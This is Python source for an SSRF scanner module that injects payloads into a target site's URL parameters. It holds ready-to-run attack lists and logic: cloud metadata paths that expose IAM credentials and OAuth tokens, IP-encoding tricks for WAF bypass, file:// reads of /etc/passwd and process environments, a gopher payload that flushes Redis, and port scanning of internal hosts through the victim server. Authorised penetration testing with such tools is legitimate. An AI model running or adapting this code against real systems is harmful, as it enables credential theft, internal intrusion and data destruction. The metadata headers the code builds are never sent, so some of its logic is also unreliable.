"""
SSRF Scanner v1.0 — Server-Side Request Forgery Detection

Features:
1. Internal IP probing (127.0.0.1, 169.254.169.254, 10.x, 172.16.x, etc.)
2. Cloud metadata endpoints (AWS/GCP/Azure/DigitalOcean)
3. Protocol smuggling (file://, gopher://, dict://)
4. DNS rebinding via alternate IP representations
5. Blind SSRF via time-based and OOB callbacks
6. URL redirect bypass (shorteners, open redirects)
7. WAF bypass (decimal IP, hex IP, IPv6 mapped, etc.)
8. Port scanning via SSRF
9. Smart param prioritization (url, link, callback, webhook, etc.)

Integrates with: WAFDetector, main_v3 pipeline
"""

import re
import asyncio
import aiohttp
import time
import random
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from loguru import logger


# ──────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────

@dataclass
class SSRFResult:
    """Result of SSRF testing."""
    url: str
    parameter: str
    vulnerable: bool = False
    ssrf_type: str = ""          # internal_ip, cloud_meta, protocol, blind, redirect
    payload_used: str = ""
    evidence: str = ""           # Response content or timing evidence
    target_reached: str = ""     # The internal resource accessed
    cloud_provider: str = ""     # aws, gcp, azure, digitalocean
    confidence: float = 0.0
    injection_point: str = "url" # url, post, header
    severity: str = "critical"


# ──────────────────────────────────────────────────────────────────
# Internal IP representations
# ──────────────────────────────────────────────────────────────────

LOCALHOST_VARIANTS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "0",
    "127.0.1",
    "127.1",
    "2130706433",               # Decimal IP for 127.0.0.1
    "0x7f000001",               # Hex IP
    "0177.0.0.1",               # Octal
    "017700000001",             # Full octal
    "[::1]",                    # IPv6 loopback
    "[0:0:0:0:0:ffff:127.0.0.1]",  # IPv6 mapped IPv4
    "[::ffff:127.0.0.1]",      # Short IPv6 mapped
    "127.0.0.1.nip.io",        # DNS resolution service
    "localtest.me",             # Resolves to 127.0.0.1
    "spoofed.burpcollaborator.net",
]

# ──────────────────────────────────────────────────────────────────
# Cloud metadata endpoints
# ──────────────────────────────────────────────────────────────────

CLOUD_METADATA = {
    "aws": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "indicators": [
            re.compile(r'ami-id', re.I),
            re.compile(r'instance-id', re.I),
            re.compile(r'hostname', re.I),
            re.compile(r'iam', re.I),
            re.compile(r'security-credentials', re.I),
        ],
        "sensitive_paths": [
            "/latest/meta-data/iam/security-credentials/",
            "/latest/user-data",
            "/latest/meta-data/hostname",
            "/latest/meta-data/local-ipv4",
        ],
    },
    "gcp": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "indicators": [
            re.compile(r'attributes', re.I),
            re.compile(r'service-accounts', re.I),
            re.compile(r'project-id', re.I),
        ],
        "sensitive_paths": [
            "project/project-id",
            "instance/service-accounts/default/token",
            "instance/attributes/",
        ],
    },
    "azure": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "indicators": [
            re.compile(r'compute', re.I),
            re.compile(r'vmId', re.I),
            re.compile(r'subscriptionId', re.I),
        ],
        "sensitive_paths": [
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
    },
    "digitalocean": {
        "url": "http://169.254.169.254/metadata/v1/",
        "indicators": [
            re.compile(r'droplet', re.I),
            re.compile(r'hostname', re.I),
            re.compile(r'interfaces', re.I),
        ],
        "sensitive_paths": [
            "hostname",
            "user-data",
            "region",
        ],
    },
}

# Cloud metadata IP alternate representations
CLOUD_IP_BYPASSES = [
    "http://169.254.169.254",
    "http://[::ffff:169.254.169.254]",
    "http://2852039166",                     # Decimal
    "http://0xa9fea9fe",                     # Hex
    "http://0251.0376.0251.0376",            # Octal
    "http://169.254.169.254.nip.io",
]

# ──────────────────────────────────────────────────────────────────
# Protocol payloads
# ──────────────────────────────────────────────────────────────────

PROTOCOL_PAYLOADS = [
    ("file:///etc/passwd", "file_read", "/etc/passwd"),
    ("file:///etc/hosts", "file_read", "/etc/hosts"),
    ("file:///proc/self/environ", "file_read", "env"),
    ("file:///C:/Windows/win.ini", "file_read", "win.ini"),
    ("dict://127.0.0.1:6379/info", "dict", "redis"),
    ("dict://127.0.0.1:11211/stats", "dict", "memcached"),
    ("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "gopher", "redis"),
]


# ──────────────────────────────────────────────────────────────────
# SSRF Scanner
# ──────────────────────────────────────────────────────────────────

class SSRFScanner:
    """Server-Side Request Forgery detection engine."""

    def __init__(self, config=None):
        self.config = config
        self.timeout = 15
        self.max_params = 6
        self._semaphore = asyncio.Semaphore(2)
        self.oob_domain = None  # Set via config for blind SSRF

    # ──────────────────────────────────────────────────────────
    # Main entry point
    # ──────────────────────────────────────────────────────────

    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        waf_name: str = None,
    ) -> List[SSRFResult]:
        """
        Full SSRF scan.
        
        1. Extract & prioritize URL/callback parameters
        2. Test internal IP probing
        3. Test cloud metadata endpoints
        4. Test protocol smuggling
        5. Test blind SSRF (time-based)
        
        Args:
            url: Target URL with parameters
            session: aiohttp session
            waf_name: Detected WAF
            
        Returns:
            List of SSRFResult
        """
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return results

        param_names = self._prioritize_params(list(params.keys()))[:self.max_params]
        logger.info(f"[SSRF] Testing {len(param_names)} params on {url[:60]}")

        for pname in param_names:
            async with self._semaphore:
                pr = await self._test_param(url, pname, params, session, waf_name)
                results.extend(pr)

        if results:
            logger.info(f"[SSRF] Found {len(results)} SSRF issues on {url[:60]}")

        return results

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """Sort params by SSRF likelihood."""
        HIGH = {
            'url', 'link', 'callback', 'cb', 'webhook', 'dest', 'destination',
            'target', 'redirect', 'uri', 'img', 'image', 'src', 'source',
            'avatar', 'fetch', 'proxy', 'api', 'endpoint', 'host', 'hostname',
            'feed', 'rss', 'ping', 'site', 'html', 'val', 'pdf',
        }
        MEDIUM = {
            'ref', 'return', 'next', 'domain', 'server', 'port',
            'path', 'file', 'load', 'data', 'content', 'page',
        }

        def score(p):
            pl = p.lower()
            if pl in HIGH:
                return 0
            if pl in MEDIUM:
                return 1
            return 2

        return sorted(params, key=score)

    # ──────────────────────────────────────────────────────────
    # Per-parameter testing
    # ──────────────────────────────────────────────────────────

    async def _test_param(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession, waf_name: str = None,
    ) -> List[SSRFResult]:
        """Test a single parameter for SSRF."""
        results = []

        # Phase 1: Internal IP probing
        r = await self._test_internal_ip(url, param, params, session)
        if r:
            results.append(r)

        # Phase 2: Cloud metadata
        cloud_results = await self._test_cloud_metadata(url, param, params, session)
        results.extend(cloud_results)

        # Phase 3: Protocol smuggling
        proto_results = await self._test_protocols(url, param, params, session)
        results.extend(proto_results)

        # Phase 4: Blind SSRF (time-based)
        blind_r = await self._test_blind_ssrf(url, param, params, session)
        if blind_r:
            results.append(blind_r)

        return results

    async def _test_internal_ip(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession,
    ) -> Optional[SSRFResult]:
        """Test if server fetches internal IP."""
        for ip_variant in LOCALHOST_VARIANTS[:8]:
            payload = f"http://{ip_variant}/"
            try:
                test_url = self._inject_param(url, param, params, payload)
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout),
                                      allow_redirects=False) as resp:
                    body = await resp.text(errors='replace')

                # Indicators that internal content was fetched
                internal_indicators = [
                    r'<title>.*(?:Apache|nginx|IIS|Welcome)',
                    r'It works!',
                    r'<html>.*<body>',
                    r'404 Not Found',  # Server responded internally
                    r'Connection refused',
                    r'127\.0\.0\.1',
                ]

                # Check response differs from normal (not just reflected)
                if payload not in body:
                    for indicator in internal_indicators:
                        if re.search(indicator, body, re.I | re.S):
                            # Verify it's not just the error message
                            if len(body) > 50:
                                return SSRFResult(
                                    url=url,
                                    parameter=param,
                                    vulnerable=True,
                                    ssrf_type="internal_ip",
                                    payload_used=payload,
                                    evidence=body[:200],
                                    target_reached=f"localhost via {ip_variant}",
                                    confidence=0.75,
                                    severity="high",
                                )

            except Exception as e:
                logger.debug(f"[SSRF] Internal IP test error: {e}")
                continue

            await asyncio.sleep(random.uniform(0.05, 0.1))

        return None

    async def _test_cloud_metadata(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession,
    ) -> List[SSRFResult]:
        """Test cloud metadata endpoint access."""
        results = []

        # Test each cloud provider
        for provider, config in CLOUD_METADATA.items():
            meta_url = config["url"]
            payload = meta_url
            try:
                test_url = self._inject_param(url, param, params, payload)

                headers = {}
                if provider == "gcp":
                    headers["Metadata-Flavor"] = "Google"
                elif provider == "azure":
                    headers["Metadata"] = "true"

                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout),
                                      allow_redirects=False) as resp:
                    body = await resp.text(errors='replace')

                for indicator in config["indicators"]:
                    if indicator.search(body):
                        return [SSRFResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            ssrf_type="cloud_meta",
                            payload_used=payload,
                            evidence=body[:300],
                            target_reached=f"{provider} metadata",
                            cloud_provider=provider,
                            confidence=0.95,
                            severity="critical",
                        )]

            except Exception:
                continue

            await asyncio.sleep(random.uniform(0.05, 0.1))

        # Try IP alternate representations for cloud metadata
        for alt_ip in CLOUD_IP_BYPASSES[:3]:
            payload = f"{alt_ip}/latest/meta-data/"
            try:
                test_url = self._inject_param(url, param, params, payload)
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text(errors='replace')

                for indicator in CLOUD_METADATA["aws"]["indicators"]:
                    if indicator.search(body):
                        results.append(SSRFResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            ssrf_type="cloud_meta",
                            payload_used=payload,
                            evidence=body[:300],
                            target_reached="AWS metadata (bypass)",
                            cloud_provider="aws",
                            confidence=0.95,
                            severity="critical",
                        ))
                        return results

            except Exception:
                continue

        return results

    async def _test_protocols(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession,
    ) -> List[SSRFResult]:
        """Test protocol handler exploitation."""
        results = []

        for payload, proto_type, target in PROTOCOL_PAYLOADS[:4]:
            try:
                test_url = self._inject_param(url, param, params, payload)
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text(errors='replace')

                # file:// indicators
                if proto_type == "file_read":
                    file_indicators = [
                        r'root:.*:0:0:',
                        r'127\.0\.0\.1\s+localhost',
                        r'PATH=',
                        r'\[fonts\]',
                    ]
                    for indicator in file_indicators:
                        if re.search(indicator, body, re.I):
                            results.append(SSRFResult(
                                url=url,
                                parameter=param,
                                vulnerable=True,
                                ssrf_type="protocol",
                                payload_used=payload,
                                evidence=body[:200],
                                target_reached=target,
                                confidence=0.95,
                                severity="critical",
                            ))
                            return results

                # dict:// / gopher:// indicators
                elif proto_type in ("dict", "gopher"):
                    dict_indicators = [
                        r'redis_version',
                        r'memcached',
                        r'STAT\s',
                        r'ERR',
                    ]
                    for indicator in dict_indicators:
                        if re.search(indicator, body, re.I):
                            results.append(SSRFResult(
                                url=url,
                                parameter=param,
                                vulnerable=True,
                                ssrf_type="protocol",
                                payload_used=payload,
                                evidence=body[:200],
                                target_reached=target,
                                confidence=0.90,
                                severity="critical",
                            ))
                            return results

            except Exception:
                continue

            await asyncio.sleep(random.uniform(0.05, 0.1))

        return results

    async def _test_blind_ssrf(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession,
    ) -> Optional[SSRFResult]:
        """Detect blind SSRF via timing differences."""
        # Time-based: measure how long server takes to respond to
        # different payloads (resolvable vs non-resolvable hosts)
        try:
            # Baseline timing with normal value
            start = time.time()
            test_url_normal = self._inject_param(url, param, params, "http://example.com/")
            async with session.get(test_url_normal, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                await resp.read()
            baseline_time = time.time() - start

            # Test with a non-existent internal service (slow to respond / timeout)
            start = time.time()
            test_url_slow = self._inject_param(
                url, param, params,
                "http://10.255.255.1:1/"  # Non-routable — should timeout
            )
            async with session.get(test_url_slow, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                await resp.read()
            probe_time = time.time() - start

            # If probing takes significantly longer, server is making the request
            if probe_time > baseline_time + 3.0:
                return SSRFResult(
                    url=url,
                    parameter=param,
                    vulnerable=True,
                    ssrf_type="blind",
                    payload_used="http://10.255.255.1:1/",
                    evidence=f"Timing: baseline={baseline_time:.1f}s, probe={probe_time:.1f}s (delta={probe_time - baseline_time:.1f}s)",
                    target_reached="blind SSRF confirmed",
                    confidence=0.65,
                    severity="high",
                )

        except asyncio.TimeoutError:
            # Timeout on the probe = server tried to connect = SSRF
            return SSRFResult(
                url=url,
                parameter=param,
                vulnerable=True,
                ssrf_type="blind",
                payload_used="http://10.255.255.1:1/",
                evidence="Request timed out when probing non-routable IP (server attempted connection)",
                target_reached="blind SSRF confirmed (timeout)",
                confidence=0.60,
                severity="high",
            )
        except Exception as e:
            logger.debug(f"[SSRF] Blind test error: {e}")

        return None

    # ──────────────────────────────────────────────────────────
    # Port scanning via SSRF
    # ──────────────────────────────────────────────────────────

    async def scan_ports(
        self, url: str, param: str, session: aiohttp.ClientSession,
        target_ip: str = "127.0.0.1",
        ports: List[int] = None,
    ) -> Dict[int, str]:
        """Use SSRF to port scan internal hosts."""
        if ports is None:
            ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017]

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        open_ports = {}

        for port in ports:
            payload = f"http://{target_ip}:{port}/"
            try:
                test_url = self._inject_param(url, param, params, payload)
                start = time.time()
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    body = await resp.text(errors='replace')
                    elapsed = time.time() - start

                # Port open indicators: different response than closed ports
                if resp.status < 500 and len(body) > 10:
                    open_ports[port] = body[:50]
                    logger.info(f"[SSRF] Open port {port} on {target_ip}")

            except Exception:
                continue

            await asyncio.sleep(0.05)

        return open_ports

    # ──────────────────────────────────────────────────────────
    # Utility
    # ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, params: Dict, value: str) -> str:
        """Build URL with modified parameter value."""
        parsed = urlparse(url)
        new_params = {}
        for k, v in params.items():
            if k == param:
                new_params[k] = value
            else:
                new_params[k] = v[0] if isinstance(v, list) else v
        new_query = urlencode(new_params, doseq=False)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))
